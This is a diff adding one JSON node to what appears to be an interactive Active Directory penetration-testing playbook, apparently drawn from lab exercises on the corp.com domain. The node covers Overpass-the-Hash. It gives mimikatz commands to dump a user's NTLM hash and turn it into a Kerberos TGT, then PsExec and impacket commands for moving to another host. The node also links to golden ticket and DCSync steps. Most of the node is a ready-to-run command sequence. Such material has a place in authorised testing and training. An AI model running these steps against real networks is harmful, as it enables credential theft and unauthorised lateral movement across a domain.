@@ -1,0 +1,42 @@
+{
+  "id": "overpass_the_hash",
+  "phase": "AD",
+  "title": "Overpass-the-Hash — Turn an NTLM Hash into a Kerberos TGT",
+  "body": "Pass-the-Hash only works against NTLM-authenticating services. Overpass-the-Hash 'over'-abuses the NTLM hash to request a real Kerberos TGT, so you can then use Kerberos-only tools (like the official Microsoft PsExec) and blend into normal Kerberos traffic.\n\nThe flow: you have a user's NTLM hash (from mimikatz on a box where they were logged in). mimikatz sekurlsa::pth takes that hash and spawns a new process (usually PowerShell) whose logon session is primed with the hash. The moment that process does anything requiring domain auth, the hash is converted into a TGT by the KDC.\n\nWHY THIS BEATS PLAIN PtH:\n  - Works against Kerberos-only services (plain PtH can't)\n  - The official PsExec.exe accepts Kerberos tickets but NOT password hashes — overpass bridges that gap\n  - Looks like normal Kerberos activity, not anomalous NTLM\n\nIMPORTANT whoami quirk:\n  After sekurlsa::pth, running whoami in the new PowerShell shows the ORIGINAL user (e.g. jeff), not the impersonated one (jen). That's expected — whoami reads the process token, which hasn't changed; the imported Kerberos material is separate. Don't panic, it's working. Verify with klist instead.\n\nNO TICKETS UNTIL YOU AUTHENTICATE:\n  Right after pth, klist shows zero cached tickets — jen hasn't done an interactive logon. Trigger a TGT by touching a domain resource: net use \\\\target. THEN klist shows the TGT (Server: krbtgt) plus a TGS for the service you touched.\n\nThis is also exactly what a golden ticket does mechanically (forge/inject a ticket, then PsExec by hostname) — overpass is the 'I have the hash, let the KDC mint the ticket' version; golden is the 'I have krbtgt's hash, I mint the ticket myself' version.",
+  "cmd": "# ══════════════════════════════════════════════════\n# STEP 1 — get the NTLM hash (mimikatz on a box where target was logged in)\n# ══════════════════════════════════════════════════\nmimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords\n#   ... find the target user's session ...\n#   * Username : jen\n#   * NTLM     : 369def79d8372408bf6e93364cc93075\n\n# ══════════════════════════════════════════════════\n# STEP 2 — overpass: hash -> primed PowerShell session\n# ══════════════════════════════════════════════════\nmimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell\n#   spawns a NEW PowerShell window primed with jen's hash\n\n# ══════════════════════════════════════════════════\n# STEP 3 — in the NEW PowerShell, trigger TGT issuance\n# ══════════════════════════════════════════════════\n# whoami here shows jeff (original token) — that's normal, ignore it.\nklist                       # (0) cached tickets — expected, no logon yet\nnet use \\\\files04           # touch a domain resource -> KDC issues a TGT\nklist                       # now shows: Server: krbtgt/CORP.COM (the TGT) + a cifs TGS\n\n# ══════════════════════════════════════════════════\n# STEP 4 — use Kerberos (official PsExec accepts tickets, not hashes)\n# ══════════════════════════════════════════════════\ncd C:\\Tools\\SysinternalsSuite\n.\\PsExec.exe \\\\files04 cmd          # uses the TGT in this session\n# whoami -> corp\\jen   hostname -> FILES04\n# NOTE: \\\\files04 (hostname) for Kerberos. \\\\<IP> would force NTLM and fail.\n\n# ══════════════════════════════════════════════════\n# FROM KALI ALTERNATIVE — impacket does this directly\n# ══════════════════════════════════════════════════\n# Request a TGT from a hash and cache it, then use -k:\nimpacket-getTGT corp.com/jen -hashes :369def79d8372408bf6e93364cc93075\nexport KRB5CCNAME=jen.ccache\nimpacket-psexec -k -no-pass corp.com/jen@files04.corp.com",
+  "warn": "After sekurlsa::pth, whoami shows the ORIGINAL user, not the impersonated one — this is expected (it reads the process token, not the Kerberos material). Verify the attack worked with klist after touching a domain resource, not with whoami.",
+  "choices": [
+    {
+      "label": "Have an existing ticket to steal instead — pass-the-ticket",
+      "next": "pass_the_ticket"
+    },
+    {
+      "label": "Got krbtgt hash — forge a golden ticket (persistence)",
+      "next": "golden_ticket"
+    },
+    {
+      "label": "Use the ticket — PsExec to the target",
+      "next": "psexec_lateral"
+    },
+    {
+      "label": "Where did the hash come from? — mimikatz",
+      "next": "mimikatz"
+    },
+    {
+      "label": "Plain hash, NTLM service — pass-the-hash",
+      "next": "pth"
+    },
+    {
+      "label": "On the DC — DCSync everything",
+      "next": "dcsync"
+    },
+    {
+      "label": "Back to lateral movement overview",
+      "next": "lateral_movement"
+    },
+    {
+      "label": "Back to jump menu",
+      "next": "jump_menu"
+    }
+  ]
+}
